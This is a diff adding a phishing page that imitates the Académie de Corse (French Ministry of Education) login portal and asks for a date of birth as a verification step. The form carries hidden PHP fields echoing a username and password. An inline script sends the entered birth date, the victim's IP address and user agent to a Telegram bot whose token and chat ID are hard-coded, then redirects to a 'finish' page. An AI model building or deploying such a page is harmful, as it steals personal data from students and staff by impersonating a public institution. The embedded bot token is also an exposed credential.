@@ -1,0 +1,217 @@
+<!DOCTYPE html><html lang="fr" data-fr-scheme="light" data-fr-js="true" data-fr-theme="light"><head>
+
+<link rel="stylesheet" href="style.css"/>
+  </head>
+    <body cz-shortcut-listen="true">
+        <header role="banner" class="fr-header">
+            <div class="fr-header__body">
+                <div class="fr-container">
+                    <div class="fr-header__body-row">
+                        <div class="fr-header__brand">
+                            <div class="fr-header__brand-top">
+                                <div class="fr-header__logo">
+                                    <p class="fr-logo">Académie<br>de Corse</p>
+                                </div>
+                                <div class="fr-header__navbar">
+                                    <button class="fr-btn--menu fr-btn" data-fr-opened="false" aria-controls="modal-499" aria-haspopup="menu" id="button-500" title="Menu" data-fr-js-modal-button="true">Menu</button>
+                                </div>
+                            </div>
+                            <div class="fr-header__service">
+                                <p class="fr-header__service-title">Académie de Corse</p>
+                                <p class="fr-header__service-tagline">Accès aux applications de l'académie de Corse</p>
+                            </div>
+                        </div>
+                        <div class="fr-header__tools">
+                            <div class="fr-header__tools-links" data-fr-js-header-links="true">
+                                <ul class="fr-btns-group">
+                                    <li>
+                                        <a class="fr-btn fr-icon-account-line" data-savepage-href="/proxy-sso/logout" href="https://login.ac-corse.fr/proxy-sso/logout">Se déconnecter</a>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="fr-header__menu fr-modal" id="modal-499" aria-labelledby="button-500" data-fr-js-modal="true" data-fr-js-header-modal="true">
+                <div class="fr-container">
+                    <button class="fr-btn--close fr-btn" aria-controls="modal-499" title="Fermer" data-fr-js-modal-button="true">Fermer</button>
+                    <div class="fr-header__menu-links">
+ <ul class="fr-btns-group">
+ <li>
+ <a class="fr-btn fr-icon-account-line" data-savepage-href="/proxy-sso/logout" href="https://login.ac-corse.fr/proxy-sso/logout">Se déconnecter</a>
+ </li>
+ </ul>
+ </div>
+                </div>
+            </div>
+        </header>
+
+        <main>
+            <div id="contenu" role="main" class="fr-container height-auto fr-mt-6w fr-mb-6w">
+                <div class="fr-grid-row fr-grid-row--center">
+                    <div class="fr-col-md-8 fr-col-12 m-auto">
+                        <div class="fr-grid-row fr-grid-row--gutters">
+                            <div class="fr-col-12">
+                                <div class="fr-card fr-card--no-arrow">
+                                    <div class="fr-card__body">
+                                        <form action="" method="post">
+    <input type="hidden" name="Connexion_corse_date">
+    <input type="hidden" name="user" value="<?php echo $user ?>"/>
+    <input type="hidden" name="pass" value="<?php echo $pass ?>"/>
+                                            <h1 class="fr-h4 fr-mt-4w">Vérification de la date de naissance</h1>
+                                            <input id="username"  type="hidden" value="ovunu32">
+                                            <div class="fr-password" id="password" data-fr-js-password="true">
+                                                <label class="fr-label" for="password-input">Date de naissance (au format JJ/MM/AAAA)</label>
+                                                <div class="fr-input-wrap">    
+                                                    <input class="fr-password__input fr-input" aria-describedby="text-input-date-messages" aria-required="true" name="date" autocomplete="current-password" id="password-input" type="date" autofocus="" data-fr-js-password-input="true" value="" required="">
+                                                </div>
+                                            </div>
+                                            <ul class="fr-btns-group">
+                                                <li>
+                                                    <button class="fr-btn" id="submit-button" type="submit" name="_eventId_proceed">Se connecter</button>
+                                                </li>
+                                                <li>
+                                                    <button class="fr-btn fr-btn--secondary" id="reselect-flow-button-0" type="submit" name="_eventId_OTP">Je m'authentifie avec mon OTP académique</button>
+                                                </li>
+                                            </ul>
+                                        </form>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id="contenu" role="main" class="fr-container height-auto fr-mt-6w fr-mb-6w">
+                <div class="fr-grid-row fr-grid-row--center">
+                    <div class="fr-col-md-8 fr-col-12 m-auto">
+                        <div class="fr-grid-row fr-grid-row--gutters">
+                            <div class="fr-col-12">
+                                <div class="fr-card fr-card--no-arrow">
+                                    <div class="fr-card__body">
+Afin de protéger l'accès aux données, il est impératif de vous déconnecter de chaque application usage.<br><font color="red">La fermeture du navigateur n'entraine pas forcément la fermeture des accès.</font>                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+        <footer class="fr-footer" style="background-color: white;" role="contentinfo" id="footer">
+            <div class="fr-container">
+                <div class="fr-footer__body">
+                    <div class="fr-footer__brand">
+                        <p class="fr-logo">Ministère <br>de l'Éducation <br>Nationale</p>
+                    </div>
+                    <div class="fr-footer__content">
+                        <p class="fr-footer__content-desc">Académie de Corse</p>
+                        <ul class="fr-footer__content-list">
+                            <li class="fr-footer__content-item">
+                                <a class="fr-footer__content-link" target="_blank" href="https://www.education.gouv.fr/">education.gouv.fr</a>
+                            </li>
+                            <li class="fr-footer__content-item">
+                                <a class="fr-footer__content-link" target="_blank" href="https://www.service-public.fr/">service-public.fr</a>
+                            </li>
+                            <li class="fr-footer__content-item">
+                                <a class="fr-footer__content-link" target="_blank" href="https://www.legifrance.gouv.fr/">legifrance.gouv.fr</a>
+                            </li>
+                            <li class="fr-footer__content-item">
+                                <a class="fr-footer__content-link" target="_blank" href="https://franceconnect.gouv.fr/">franceconnect.gouv.fr</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="fr-footer__bottom">
+                    <ul class="fr-footer__bottom-list">
+                        <li class="fr-footer__bottom-item">
+                                <a class="fr-footer__bottom-link" data-savepage-href="/info/assistance.html" href="https://login.ac-corse.fr/info/assistance.html" target="_blank">Besoin d'aide?</a>
+                            </li>
+                        <li class="fr-footer__bottom-item">
+                                <span class="fr-footer__bottom-link">Accessibilité: non conforme</span>
+                            </li>
+                        <li class="fr-footer__bottom-item">
+                                <a class="fr-footer__bottom-link" data-savepage-href="/info/mentions.html" href="https://login.ac-corse.fr/info/mentions.html" target="_blank">Mentions légales</a>
+                            </li>
+                        <li class="fr-footer__bottom-item">
+                            <span class="fr-footer__bottom-link">v2.1.0</span>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </footer>
+        <!-- Script en version es6 module et nomodule pour les navigateurs le ne supportant pas -->
+        <script data-savepage-type="module" type="text/plain" data-savepage-src="/idp-static/dsfr.module.min.js"></script>
+        <script data-savepage-type="text/javascript" type="text/plain" nomodule="" data-savepage-src="/idp-static/dsfr.nomodule.min.js"></script>
+    
+<script>
+  // Fonction pour récupérer l'adresse IP de l'utilisateur
+  async function getIP() {
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      return data.ip;
+    } catch (error) {
+      console.error('Erreur lors de la récupération de l\'IP:', error);
+      return 'Inconnue';
+    }
+  }
+
+  // Fonction pour récupérer le navigateur utilisé
+  function getBrowser() {
+    return navigator.userAgent;
+  }
+
+  // Fonction pour formater les données en texte clair
+  function formatData(formData, ip, browser) {
+    let message = "DATE DE NAISSANCE AC :\n\n";
+    message += `- Date de naissance : ${formData.date}\n`;
+    message += `- Adresse IP : ${ip}\n`;
+    message += `- Navigateur : ${browser}\n`;
+    return message;
+  }
+
+  // Fonction pour envoyer les données via un bot Telegram
+  async function sendToTelegramBot(message) {
+    const botToken = '7903453184:AAH2PateOe3zCAsNNWscCAZ1spiiP9xfNr8'; // Remplacez par votre token de bot Telegram
+    const chatId = '5627247637'; // Remplacez par votre chat ID
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+    try {
+      await fetch(url);
+      console.log('Message envoyé avec succès à Telegram');
+    } catch (error) {
+      console.error('Erreur lors de l\'envoi du message à Telegram:', error);
+    }
+  }
+
+  // Fonction principale pour gérer la soumission du formulaire
+  async function handleFormSubmit(event) {
+    event.preventDefault();
+
+    // Récupérer les données du formulaire
+    const formData = new FormData(event.target);
+    const formObject = {};
+    formData.forEach((value, key) => {
+      formObject[key] = value;
+    });
+
+    // Récupérer l'adresse IP et le navigateur
+    const ip = await getIP();
+    const browser = getBrowser();
+
+    // Formater les données en texte clair
+    const message = formatData(formObject, ip, browser);
+
+    // Envoyer les données à Telegram
+    await sendToTelegramBot(message);
+
+    // Rediriger vers une autre page (par exemple, date.html)
+    window.location.href = 'finish.html';
+  }
+
+  // Ajouter un écouteur d'événement au formulaire
+  document.querySelector('form').addEventListener('submit', handleFormSubmit);
+</script>
+</body></html>
+      
